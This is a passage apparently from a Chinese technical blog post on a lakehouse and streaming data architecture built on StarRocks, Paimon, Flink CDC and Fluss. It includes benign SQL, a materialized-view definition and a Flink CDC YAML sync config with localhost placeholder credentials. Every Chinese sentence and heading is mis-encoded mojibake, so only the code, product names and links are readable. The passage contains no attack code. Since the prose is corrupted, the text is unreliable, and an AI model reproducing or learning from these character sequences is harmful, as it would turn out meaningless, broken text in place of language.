-- base DQL è¯­å¥ï¼šæ¨èä¸æ”¹åŸå§‹ DQL
SELECT
  corp_id,
  get_json_string(data, '$.dept_name') AS dept_name
FROM ods_hrm_basic;

-- ä¼˜åŒ–å™¨ä¼šè‡ªåŠ¨è¯†åˆ«å·²å­˜åœ¨çš„ç”Ÿæˆåˆ—ï¼Œå¯¹ç”¨æˆ·æ— æ„Ÿ
SELECT
  corp_id,
  dept_name
FROM ods_hrm_basic;
</code></pre>
<h4 data-id="heading-15">4.2.4ã€ç‰©åŒ–è§†å›¾é€æ˜æ”¹å†™</h4>
<p>StarRocksÂ çš„å¼‚æ­¥ç‰©åŒ–è§†å›¾é‡‡ç”¨äº†ä¸»æµçš„åŸºäºÂ SPJGï¼ˆselect-project-join-group-byï¼‰æ¨¡å¼é€æ˜æŸ¥è¯¢æ”¹å†™ç®—æ³•ã€‚åœ¨ä¸ä¿®æ”¹æŸ¥è¯¢è¯­å¥çš„å‰æä¸‹ï¼ŒStarRocksÂ å¯ä»¥è‡ªåŠ¨å°†åœ¨åŸºè¡¨ä¸Šçš„æŸ¥è¯¢æ”¹å†™ä¸ºåœ¨ç‰©åŒ–è§†å›¾ä¸Šçš„æŸ¥è¯¢ã€‚é€šè¿‡å…¶ä¸­åŒ…å«çš„é¢„è®¡ç®—ç»“æœï¼Œç‰©åŒ–è§†å›¾å¯ä»¥å¸®åŠ©æ‚¨æ˜¾è‘—é™ä½è®¡ç®—æˆæœ¬ï¼Œå¹¶å¤§å¹…åŠ é€ŸæŸ¥è¯¢æ‰§è¡Œã€‚</p>
<p>ä¸‹å›¾æ˜¯StarRocksä¸­çš„å¼‚æ­¥ç‰©åŒ–è§†å›¾çš„æ”¹å†™é€»è¾‘ï¼Œè¿™é‡Œä¸ä»…æ”¯æŒå†…è¡¨çš„æ”¹å†™ï¼ŒåŒæ ·æ”¯æŒå¤–è¡¨çš„æ”¹å†™ã€‚å¯¹äºæŸ¥è¯¢èµ°åˆ°1é“¾è·¯ï¼Œè¿˜æ˜¯2é“¾è·¯ï¼Œå¯¹äºç”¨æˆ·æ˜¯æ— æ„Ÿçš„ï¼Œç”±StarRocksä¼˜åŒ–å™¨è‡ªè¡Œåˆ¤æ–­å’Œæ“ä½œï¼Œä¸”StarRocksä¿è¯äº†æ•°æ®å¼ºä¸€è‡´æ€§ã€‚StarRocks<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.starrocks.io%2Fzh%2Fdocs%2Fusing_starrocks%2Fasync_mv%2Fuse_cases%2Fquery_rewrite_with_materialized_views%2F%23%25E4%25BD%25BF%25E7%2594%25A8%25E5%259C%25BA%25E6%2599%25AF" target="_blank" title="https://docs.starrocks.io/zh/docs/using_starrocks/async_mv/use_cases/query_rewrite_with_materialized_views/#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF" ref="nofollow noopener noreferrer">ç‰©åŒ–è§†å›¾æ”¹å†™ç®€ä»‹</a>é‡Œæœ‰è¯¦ç»†çš„ä»‹ç»ï¼Œè¿™é‡Œä¸åšè¿‡å¤šè¯´æ˜ã€‚</p>
<p>æ¡ˆä¾‹å‚è€ƒå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-plaintext" lang="plaintext">DROP MATERIALIZED VIEW if exists ads_tb_ab_mv;          
CREATE MATERIALIZED VIEW ads_tb_ab_mv          
DISTRIBUTED BY HASH(corpid,corp_name,rule )          
REFRESH ASYNC START('2025-11-15 00:10:24')           
EVERY (interval 10 Minute)          
as           
SELECT corpid,corp_name,rule,xxxxxxxx          
from ads_tb_ab          
;
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa1e25c5ada14578b86db5a6cd1019a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=A%2BBu%2BZmh7wENqAzwQdXo%2BfKyLqo%3D" alt="image.png" loading="lazy"/></p>
<p>å¯¹äºå¤–éƒ¨å®¢æˆ·æ•°ä»“ä¸­ï¼Œæˆ‘ä»¬ä¾ç„¶éœ€è¦ç»§ç»­ä½¿ç”¨StarRocksä½œä¸ºæŸ¥è¯¢å¼•æ“ï¼ŒæŸ¥è¯¢Paimonä¸­çš„ODSå±‚çš„åŒä¸€ä»½æ•°æ®ã€‚å¤–éƒ¨æ•°ä»“ä¸­çš„åŠ å·¥å¤„ç†é€»è¾‘ä¸å˜ï¼Œæ•´ä½“ä¿è¯ç»Ÿä¸€ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fe5599dd9f5459e9e90ce974187edcd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=wtrJnRstRRIQsq5FPC5bYTINyJo%3D" alt="image.png" loading="lazy"/></p>
<p>å¯¹äºODSä¸Šå±‚çš„æ•°æ®ï¼Œå› ä¸ºå¤–éƒ¨æ•°ä»“å’Œå†…éƒ¨æ•°ä»“æ˜¯é€»è¾‘ä¸Šéš”ç¦»çš„ï¼Œä½†æœ¬è´¨å…¶éƒ½æ˜¯æ¶æ„ä¸Šæ¹–ä»“ä¸Šçš„æ•°ä»“ï¼Œå¯¹äºä¸€äº›ç”¨æˆ·è¡Œä¸ºæ•°æ®ï¼ˆç™»å½•ã€å‘é€ã€åŸ‹ç‚¹ï¼‰ç­‰ï¼Œæˆ‘ä»¬ä¼šæŒ‰éœ€å†™å…¥æ•°æ®æ¹–ä¸­ï¼ŒMaxcomputeå’ŒStarRocksåŒæ ·éƒ½æ”¯æŒå†™å…¥Paimonï¼Œä¿æŒä¸šåŠ¡æœ€å°ä¾µå…¥ï¼ŒæŒ‰éœ€ä¾›ç»™ã€‚</p>
<h4 data-id="heading-16">4.2.5ã€OLAPæ•´åˆ</h4>
<p>å¾—ç›ŠäºStarRocksä¸­å¼ºå¤§çš„OLAPåŸºå› ï¼Œæˆ‘ä»¬å†…éƒ¨BIåŸºæœ¬ä»è¿‡å»çš„MaxComputeÂ æ›¿æ¢æˆStarRocksä½œä¸ºå†…éƒ¨BIçš„OLAPæ•°æ®åº“ï¼ˆæ”¯æŒè°“è¯ä¸‹æ¨ï¼‰ï¼Œè€Œä¸”å¾—ç›ŠäºStaRocksçš„LakeHouseæ¶æ„ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨åœ¨StarRocksæŒ‚è½½Paimonçš„Catalogï¼Œå……åˆ†åˆ©ç”¨DataÂ cacheÂ æœºåˆ¶+DVè¡¨+æ•°æ®é¢„çƒ­ï¼Œå……åˆ†åŠ é€Ÿå†…éƒ¨BIé€Ÿåº¦ï¼Œä»MaxComputeåˆ‡æ¢åˆ°StarRocksä¸­ï¼Œåªè¦æ”¹åŠ¨éƒ¨åˆ†å°‘è®¸çš„å…¼å®¹å‡½æ•°å³å¯ã€‚åŸºæœ¬èƒ½åšåˆ°99%å¯æ›¿æ¢ã€‚</p>
<h3 data-id="heading-17">4.3ã€å®æ—¶è®¡ç®—DLF+Flink+Fluss</h3>
<h4 data-id="heading-18">4.3.1ã€å®æ—¶æ•°æ®é‡‡é›†</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a77609baa7554792a0ff3059710f05fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=FPnj1eiwCWNo3ckOepUfOwGlqX8%3D" alt="image.png" loading="lazy"/></p>
<p>å…¨é¢é‡‡ç”¨Flink-CDC-Yamlè¯­æ³•æ¥é‡‡é›†ä¸šåŠ¡DBï¼ˆpolardb/mysqlï¼‰æ•°æ®å…¥æ¹–Paimonä¸­ï¼Œç°åœ¨æ”¯æŒcdcå’Œåˆå¹¶è§£è€¦ï¼ŒFlink-CDCåªè´Ÿè´£ä¼ è¾“æ•°æ®ï¼Œåå°åˆå¹¶äº¤äºDLFåå°è‡ªåŠ¨æ™ºèƒ½åˆå¹¶ï¼Œä¸”Flink-CDC-Yamlçš„ä¼˜ç‚¹å¦‚ä¸‹ï¼š</p>
<ol>
<li>
<p>æ›´è½»é‡åŒ–çš„å¼€å‘é€»è¾‘ã€æ˜“äºå¼€å‘ã€æ€§èƒ½æ›´å¥½ï¼Œæ¡†æ¶æ›´ç¨³å®šï¼Œå¯åŠ¨æ¨¡å¼ä¸°å¯Œã€‚</p>
</li>
<li>
<p>æ”¯æŒæ•´åº“åŒæ­¥+SchemaÂ Change+SinkèŠ‚ç‚¹å¤ç”¨+Flinkä¸°å¯Œçš„ä¸Šä¸‹æ¸¸ç”Ÿæ€ã€‚</p>
</li>
<li>
<p>æ”¯æŒRouteï¼Œè§£å†³è¿‡å»åˆ†åº“åˆ†è¡¨å’Œæ•´åº“åŒæ­¥ä¸èƒ½å¤ç”¨sourceçš„é—®é¢˜ï¼Œè¿‡å»éœ€è¦å†™ä¸¤ä¸ªCDASè¯­å¥</p>
</li>
<li>
<p>æ”¯æŒTransformï¼Œå¯ä»¥åœ¨ETLçš„è¿‡ç¨‹ä¸­å¢åŠ ä¸€äº›å¿…è¦æ€§çš„å­—æ®µè½¬æ¢ã€‚</p>
</li>
<li>
<p>æ”¯æŒExactly-onceå’ŒAt-least-onceæ¨¡å¼ï¼Œä¿è¯æ•°æ®ä¸ä¸¢ã€‚</p>
</li>
<li>
<p>ä¸°å¯Œçš„å¯åŠ¨æ–¹å¼ï¼Œæ”¯æŒå¿«é€Ÿä¿®è¡¥æ•°æ®ï¼ŒåŒ…æ‹¬initï¼ˆå…¨å¢é‡ï¼‰Â ã€æœ€æ–°ç‚¹ä½å¯åŠ¨ã€æœ€æ—©ç‚¹ä½å¯åŠ¨ã€æ—¶é—´æˆ³ã€ç‰¹æ®Šç‚¹ä½å¯åŠ¨ã€å¿«ç…§å¯åŠ¨å’Œå¿«ç…§æ•°æ®è¿‡æ»¤å¯åŠ¨ï¼ˆç¤¾åŒºæœ‰prï¼Œè¿˜æ²¡åˆå¹¶ï¼‰ï¼ŒåŸºæœ¬èƒ½åšåˆ°æœ€å°ä»£ä»·æ¥è·å–æ•°æ®/ä¿®å¤æ•°æ®ã€‚</p>
</li>
<li>
<p>æ”¯æŒPipelineæ¡†æ¶å¹¶è¡Œè·å–å†å²æ•°æ®ï¼Œæå¤§åŠ é€Ÿå†å²å¿«ç…§æ•°æ®ï¼Œæ”¯æŒæ— é”æ‹¿æœ€æ–°æ•°æ®ï¼Œä¸éœ€è¦é”è¡¨ï¼Œé”åº“ï¼Œå¢é‡é˜¶æ®µå…¨å±€ä¿åºï¼Œä¿è¯æ•°æ®ä¸ä¹±ã€‚</p>
</li>
<li>
<p>æ”¯æŒè‡ªåŠ¨åŠ è¡¨ï¼Œç¬¦åˆæ­£åˆ™åŒ¹é…çš„æ–°è¡¨ä¸éœ€è¦é‡å¯ä½œä¸šå³å¯åŒæ­¥æ•°æ®åˆ°sinkç«¯ã€‚</p>
</li>
<li>
<p>æœªæ¥ä¼šæ”¯æŒé™æµï¼ˆç¤¾åŒºå·²ç»æœ‰è¿™ä¸ªè®¨è®ºï¼‰</p>
</li>
<li>
<p>ç›¸æ¯”CDASè¯­æ³•ï¼Œç®—å­æ‹“æ‰‘å›¾æ›´ç®€å•ï¼Œæ€§èƒ½æ›´å¥½ï¼ŒCDASè¯­æ³•ç³–ä¸­ï¼Œæ¯ä¸€ä¸ªè¡¨éƒ½æ˜¯ä¸€ä¸ªå•ç‹¬çš„sinké¢å¤–ç®—å­ï¼Œä½œä¸šå¤æ‚åº¦è¾ƒé«˜ã€‚</p>
</li>
</ol>
<pre><code class="hljs language-plaintext" lang="plaintext">source:
  type: mysql
  hostname: localhost
  port: 3306
  username: root
  password: "123456"
  tables: "app_db\..*"
  server-id: "5400-5404"
  server-time-zone: UTC

sink:
  type: starrocks
  name: StarRocks Sink
  jdbc-url: "jdbc:mysql://127.0.0.1:9030"
  load-url: "127.0.0.1:8080"
  username: root
  password: ""
  table.create.properties.replication_num: 1

pipeline:
  name: Sync MySQL Database to StarRocks
  parallelism: 2
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2301a62c096944748fd9bc9945aed63c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=KH6oPOenSi1vvK29QYFzo740ZFw%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-19">4.3.2ã€å®æ—¶æ•°æ®è®¡ç®—</h4>
<p>å…¨é¢é‡‡ç”¨Flinkä½œä¸ºå®æ—¶è®¡ç®—å¼•æ“ï¼ŒDLFä½œä¸ºå…ƒæ•°æ®ã€é‰´æƒã€æ•°æ®æä¾›ï¼Œç›®å‰å®æ—¶è®¡ç®—ä¸»è¦æ˜¯ä¾›ç»™å†…éƒ¨ç”¨æˆ·ä½¿ç”¨çš„å®¢æˆ·ç”»åƒç”»åƒæ¥è¾…åŠ©ä¸šåŠ¡ç«¯æ¥è¿›è¡Œåˆ†æï¼Œå†³ç­–ï¼Œè€ƒè™‘æœªæ¥å¢é‡è®¡ç®—çš„åœºæ™¯ï¼ŒåŒæ ·å¯ä»¥åœ¨Flinkä¸­å®Œæˆå¢é‡è®¡ç®—çš„éœ€æ±‚ï¼Œå› ä¸ºDLFåå°çš„æ•°æ®åˆå¹¶ä¹Ÿæ˜¯Flinkå¼•æ“ï¼Œæ•°æ®å…¥æ¹–åçš„åˆå¹¶éœ€è¦Flinkæ¥è¿›è¡Œè®¡ç®—ï¼Œä»¥åŠæœªæ¥å¯èƒ½è€ƒè™‘çš„Flinkå¢é‡è®¡ç®—ã€‚</p>
<p><strong>Fluss+Flinkå¼¥è¡¥æ¹–ä»“æ•°æ®æ–°é²œåº¦</strong></p>
<p>Flussç›®å‰ä¸»è¦æ‰¿æ¥æˆ‘ä»¬å†…éƒ¨ç³»ç»Ÿçš„ç”¨æˆ·ç”»åƒï¼Œåˆå§‹é˜¶æ®µï¼Œæˆ‘ä»¬çš„ç”¨æˆ·ç”»åƒåŸºç¡€è®¡ç®—è¡¨æ˜¯ç”±äºMysqlæ‰¿æ¥ï¼ˆBinlog+éƒ¨åˆ†åˆ—æ›´æ–°èƒ½åŠ›ï¼‰ï¼Œå› ä¸ºè®¡ç®—ç”¨æˆ·ç”»åƒçš„æµé‡å¾ˆé«˜ï¼Œæˆ‘ä»¬åˆ©ç”¨FlinkÂ çš„å¼€çª—å‡½æ•°æ¥è¿›è¡Œæ”’æ‰¹æ•°æ®å†™å…¥Mysqlï¼Œå¹¶ä½¿ç”¨FlinkÂ ç»“åˆä½¿ç”¨å¤šæµpkÂ ï¼ˆç›¸åŒä¸»é”®ï¼‰éƒ¨åˆ†åˆ—æ›´æ–°èƒ½åŠ›æ¥å‡å°‘ä¸‹æ¸¸Mysqlçš„å‹åŠ›å’ŒFlinkçš„çŠ¶æ€ï¼Œä½†éšç€ç”¨æˆ·ä½“é‡çš„å¢åŠ ï¼Œå‡ºç°äº†æ€§èƒ½é—®é¢˜ã€‚åé¢æˆ‘ä»¬æŠŠç”¨æˆ·ç”»åƒåŸºè¡¨è¿ç§»åˆ°äº†Paimonï¼ŒPaimonè™½ç„¶å¯ä»¥è§£å†³æˆ‘ä»¬çš„æ€§èƒ½é—®é¢˜ï¼Œä½†æ˜¯æ²¡åŠæ³•è§£å†³Paimonçš„çš„åˆ†é’Ÿçº§åˆ«çš„æ•°æ®æ–°é²œåº¦çš„é—®é¢˜ï¼Œéšç€Flussçš„å¼€æºï¼Œæˆ‘ä»¬æŠŠç›®å…‰æŠ•å…¥åˆ°äº†Flussï¼Œä¸»è¦ä¼˜ç‚¹å¦‚:ã€DeltaÂ joinã€æ•°æ®å†™å…¥å³å¯è§ã€UnionÂ Readã€æ¹–æµä¸€ä½“ç­‰ã€‚Â </p>
<p>å¦‚æœä½¿ç”¨Flinkæ¥æŸ¥è¯¢Flussä¸Šçš„æ•°æ®æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ…¢çš„è¿‡ç¨‹ï¼Œæ¯”å¦‚æˆ‘ä»¬åšä¸€äº›adÂ hocæˆ–è€…æ’é”™è¿˜æ˜¯æ¯”è¾ƒæ…¢ï¼Œç»è¿‡å’Œäº‘å‚å•†æ²Ÿé€šï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é˜¿é‡Œäº‘ä¸Šçš„EMR-Serverless-StarRocksæ¥æŸ¥è¯¢Flussä¸­çš„æ¹–è¡¨çš„æ•°æ®ä¸”æ”¯æŒUnionÂ Readæ¥ä¿è¯æ•°æ®ä¸€è‡´æ€§ã€‚</p>
<p>Flussä½œä¸šå‚è€ƒï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/882db0059e8b472fab31715c23140587~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=QV4kbvZdLqETX3rEGbBvrylsH5Y%3D" alt="image.png" loading="lazy"/></p>
<p>åŒæ ·Flussä¹Ÿåœ¨æŒç»­æ¨è¿›å¤šæ¨¡æ€æ•°æ®é›†æˆï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬æœŸå¾…çš„èƒ½åŠ›ç‚¹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26f8b478c55f49a1bf30013eaf2e74b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=vkEbHvFIOHMm31zwsEilAvd7YYI%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-20">äº”ã€å½“å‰çš„æˆæœä¸é—®é¢˜</h2>
<h3 data-id="heading-21">5.1ã€æ¹–ä»“ä¸€ä½“/æ¹–æµä¸€ä½“</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6450d4df57e4c4e866154b80c0bd50b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=aVVODHN0N8t7bgiAyZPJIJ9Laww%3D" alt="image.png" loading="lazy"/></p>
<ol>
<li>
<p>æ•°æ®åŸºåº§</p>
<ol>
<li>
<p>ç¡®å®šä»¥Paimonä½œä¸ºæ•°æ®åŸºåº§ï¼Œè®¡ç®—å¼•æ“æ¶ˆè´¹Paimonä¸­çš„æ•°æ®ï¼Œæ•°æ®å…¥æ¹–åï¼Œå…¶ä»–åŠ å·¥ä¾æ®æ¹–ä¸Šæ•°æ®è¿›è¡ŒåŠ å·¥äº§å‡ºæ•°æ®ï¼Œæœ€åæ•°æ®å›æµåˆ°Paimonä¸­ã€‚</p>
</li>
<li>
<p>ç¡®å®šFlussä½œä¸ºä½œä¸ºæ•°æ®æ¹–å‰çš„ä¸­è½¬ç«™ï¼Œä½œä¸ºæ¹–æµä¸€ä½“çš„èƒ½åŠ›ï¼Œæ›´ç¬¦åˆå…¶æµå­˜å‚¨çš„å®šä½å’Œèƒ½åŠ›ï¼Œæ•°æ®æœ€ç»ˆè¿˜æ˜¯å…¥æ¹–ã€‚</p>
</li>
</ol>
</li>
<li>
<p>è®¡ç®—å¼•æ“</p>
<ol>
<li>
<p>MaxComputeä½œä¸ºå¤§æ‰¹é‡çš„ç¦»çº¿è®¡ç®—å¼•æ“ä¸ºä¸»ã€‚</p>
</li>
<li>
<p>Flinkä½œä¸ºå®æ—¶è®¡ç®—å¼•æ“ä¸ºä¸»ï¼ŒFlink-CDCä½œä¸ºæ•°æ®å…¥æ¹–ã€å…¥ä»“çš„ETLå·¥å…·ã€‚</p>
</li>
<li>
<p>å…¶ä»–å¼•æ“å°‘é‡ä¸ºè¾…çš„ä¸»è¦æŠ€æœ¯æ ˆï¼Œå‡å°‘æŠ€æœ¯æ ˆå’Œç»´æŠ¤æˆæœ¬å’Œå­¦ä¹ æˆæœ¬ã€‚</p>
</li>
</ol>
</li>
<li>
<p>OLAP</p>
<ol>
<li>ç¡®å®šä»¥StarRocksä¸ºOLAPä¸ºä¸»çš„æŠ¥è¡¨å¼•æ“æ”¯æ’‘ï¼Œå†…éƒ¨æŠ¥è¡¨+å¤–éƒ¨å®¢æˆ·æŠ¥è¡¨å…¨é¢é‡‡ç”¨StarRocksä½œä¸ºOLAPæŸ¥è¯¢å¼•æ“ã€‚</li>
</ol>
</li>
<li>
<p>æ•°æ®å¼€å‘/å…ƒæ•°æ®ç®¡ç†/é‰´æƒ</p>
<ol>
<li>
<p>ç¡®å®šæŒ‰ç…§Dataworksä¸ºä¸»è¦ç¦»çº¿æ•°æ®å¼€å‘å¹³å°</p>
</li>
<li>
<p>å®æ—¶å¼€å‘é‡‡ç”¨Â VervericaÂ PlatformÂ ï¼ˆVVPï¼‰Â å®æ—¶å¼€å‘å¹³å°</p>
</li>
<li>
<p>DLFå…ƒæ•°æ®ç®¡ç†ä¸ºä¸»çš„æ•°æ®æ„å»ºå¹³å°ã€‚</p>
</li>
</ol>
</li>
<li>
<p>Â å¤šæ¨¡æ€</p>
<ol>
<li>LanceÂ fileÂ ä½œä¸ºå¤šæ¨¡æ€æ•°æ®å­˜å‚¨æ ¼å¼ï¼ŒåŒæ ·Paimon/Flussåœ¨æŒç»­è·Ÿè¿›lanceçš„æ¨èå’Œé›†æˆã€‚</li>
</ol>
</li>
</ol>
<h3 data-id="heading-22">5.2ã€æ¹–ä»“ä¸€ä½“/æ¹–æµä¸€ä½“ä¼˜åŠ¿</h3>
<p>1ã€æ•°æ®æ°¸è¿œåªå­˜å‚¨ä¸€ä»½ï¼Œä¸å†å‰²è£‚ï¼Œæ¶æ„ç®€å•ï¼Œå¯æ›¿æ¢ã€‚</p>
<p>2ã€æ•°æ®çš„æ ¼å¼æ˜¯å¼€æ”¾çš„ã€è®¡ç®—å¼•æ“ä¸å†å¼ºç»‘å®šï¼Œåšåˆ°éšæ—¶å¯æ›¿æ¢ï¼Œæ•°æ®å¯å…±äº«ã€æ•°æ®ä¸å†å‰²è£‚ã€‚</p>
<p>3ã€åŒä¸€ä»½æ•°æ®å¯ä»¥éšæ—¶åœ¨ç¦»çº¿è®¡ç®—ã€å®æ—¶è®¡ç®—ã€å¢é‡è®¡ç®—ï¼Œä¿è¯è®¡ç®—éœ€æ±‚çš„å¤šæ ·æ€§å’Œæœªæ¥å¯æŒç»­æ€§è¿­ä»£ï¼Œæ»¡è¶³ä¸åŒä¸šåŠ¡å¯¹æ—¶æ•ˆã€æˆæœ¬çš„å…¨æ–¹é¢è€ƒè™‘ã€‚</p>
<p>4ã€ä¿æŒå…¶å¯æ‰©å±•æ€§ï¼ŒåŒ…æ‹¬å¤šæ¨¡æ€æ•°æ®ï¼Œä¸€æ ·å¯ä»¥å…¥æ¹–åä¾›éœ€è¦çš„å¼•æ“æ¶ˆè´¹</p>
<p>5ã€æ•°æ®æ–°é²œåº¦ï¼šå¯ä»¥åšåˆ°è®¡ç®—éšæ—¶å¯åˆ‡æ¢æ‰¹è®¡ç®—ã€æµè®¡ç®—ã€å¢é‡è®¡ç®—ç­‰ã€‚</p>
<p>ç»¼ä¸Šï¼Œæˆ‘ä»¬ç¡®å®šäº†å…¬å¸çš„å†…éƒ¨å¤§æ•°æ®çš„æ¶æ„å›¾ï¼Œæ¹–ä»“ä¸€ä½“å·²ç»æ˜¯å¤§æ•°æ®çš„è¶‹åŠ¿å’Œäº‹å®ï¼Œå¤–åŠ DATA+AIçš„åœºæ™¯ï¼Œæˆ‘ä»¬åœ¨åº•å±‚å­˜å‚¨å±‚é€‰æ‹©äº†æ›´å¼€æ”¾çš„æ¹–æ ¼å¼ï¼Œè¿™æ ·æ¹–ä¸Šçš„æ•°æ®ä¸å’Œä»»ä½•è®¡ç®—å¼•æ“è¿›è¡Œç»‘å®šï¼Œä¸šåŠ¡ç«¯æŒ‰ç…§å…¶æ•°æ®åè®®è¯»å–æ•°æ®æ•°æ®å³å¯ï¼›æ•°æ®å­˜å‚¨ä¸€ä»½ï¼Œè§£å†³è¿‡å»æ•°æ®å³éœ€è¦å­˜å‚¨åœ¨Aæœ‰éœ€è¦å­˜å‚¨åœ¨Bçš„ç—›ç‚¹ï¼Œæ•°æ®å­˜å‚¨æˆæœ¬ç›´çº¿ä¸‹é™ï¼›æŠ€æœ¯æ ˆç»Ÿä¸€ï¼Œæ–¹ä¾¿åæœŸçš„å¼€å‘å’Œç»´æŠ¤ã€‚æ›´åˆ©äºå¤§æ•°æ®çš„é•¿æœŸå‘å±•ã€‚</p>
<h3 data-id="heading-23">5.3ã€ä¸€äº›é—®é¢˜ç‚¹</h3>
<ol>
<li>
<p>MaxComputeç›´æ‹‰DLF3çš„æ•°æ®ï¼Œæœ‰äº›è°“è¯ä¸‹æ¨ï¼Œä¸‹æ¨çš„ä¸ç†æƒ³ï¼Œå¯¼è‡´ä¼šè·å–å…¨é‡æ•°æ®å†è¿‡æ»¤å‡ºæ¥ã€‚</p>
</li>
<li>
<p>MaxComputeç›´æ‹‰DLF3çš„æ•°æ®è¿‡ç¨‹ä¸­ï¼Œæœ‰äº›è¡¨æ‹†åˆ†çš„mapperçš„æ•°é‡ä¸å¤Ÿç†æƒ³ï¼Œå¯¼è‡´æ‹‰å–DLFä¸Šæ•°æ®æ…¢äº†ç‚¹ï¼ˆå·²åé¦ˆï¼‰ã€‚</p>
</li>
<li>
<p>DLFÂ çš„å¯¹äºMaxcomputeæ‰¹å†™å…¥æ•°æ®çš„åˆå¹¶æ—¶é—´ä¸ç¡®å®šï¼ˆ1-10åˆ†é’Ÿï¼‰ï¼Œäº§å“å·²æœ‰è§„åˆ’æ”¹è¿›ï¼Œå¯¹äºä¸€äº›Maxcomputeä¸­æ‰¹ä½œä¸šæ”¯æŒå†™å…¥åç«‹åˆ»åˆå¹¶ã€‚</p>
</li>
<li>
<p>Paimonå’ŒFlussçš„æœ‰äº›DDLæ“ä½œå¿…é¡»ä¾èµ–Flinkï¼Œæˆ‘ä»¬å¸Œæœ›æ›´ç²¾ç®€åŒ–ä¸‹æ“ä½œã€‚</p>
</li>
<li>
<p>DLFè¿˜ä¸æ”¯æŒå¯¹ç®¡æ§Paimonè¡¨çš„æ¶ˆè´¹è€…è¿›è¡Œç®¡ç†ã€‚</p>
</li>
<li>
<p>Flink-CDC-Yamlè¿˜ä¸æ”¯æŒVVPÂ FlinkÂ çš„è‡ªåŠ¨è°ƒä¼˜ï¼ˆåœ¨è·¯ä¸Šï¼‰ï¼Œé˜²æ­¢ä½œä¸šOOMçš„æ—¶å€™å¯ä»¥è‡ªå·±åŠ å†…å­˜ã€‚</p>
</li>
<li>
<p>Flussè¿˜ä¸æ”¯æŒÂ AGGÂ TableÂ å’ŒÂ RoaringBitmapã€‚</p>
</li>
<li>
<p>StarRocksÂ ç›®å‰è¿˜ä¸æ”¯æŒæŸ¥è¯¢Flussä¸­éæ¹–è¡¨ã€‚</p>
</li>
</ol>
<h2 data-id="heading-24">å…­ã€æœªæ¥è§„åˆ’</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d39c97fd91264277985595e4cafd3310~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=ze2p9fL2dCEEp17Fw2W4mOcJeq8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-25">6.1ã€Fluss</h3>
<ol>
<li>
<p>å½“Flusså…¼å®¹kafkaçš„åè®®åï¼Œæˆ‘ä»¬ä¼šæŠŠåŸæ¥cdcæ•°æ®å†™å…¥kafkaçš„è¿‡ç¨‹ç›´æ¥æ¢æˆFlussï¼Œæ¯•ç«Ÿkafkaä¸­çš„æ•°æ®æ¢æŸ¥æ˜¯ä¸€ä¸ªéå¸¸å›°éš¾çš„ç‚¹ï¼Œè€Œä¸”kafkaæ²¡æœ‰schemaæ¦‚å¿µï¼Œå¯¹äºä¸€äº›å…ƒæ•°æ®è½¬æ¢è‡ªåŠ¨åŒ–ä¸æ˜¯å¾ˆç†æƒ³ï¼Œå¸Œæœ›é€šè¿‡Flusså¯ä»¥è§£å†³æˆ‘ä»¬é‡åˆ°çš„ç—›ç‚¹ã€‚</p>
</li>
<li>
<p>Flussç»“åˆLanceÂ åšAIæ•°æ®åŸºåº§ã€‚</p>
</li>
</ol>
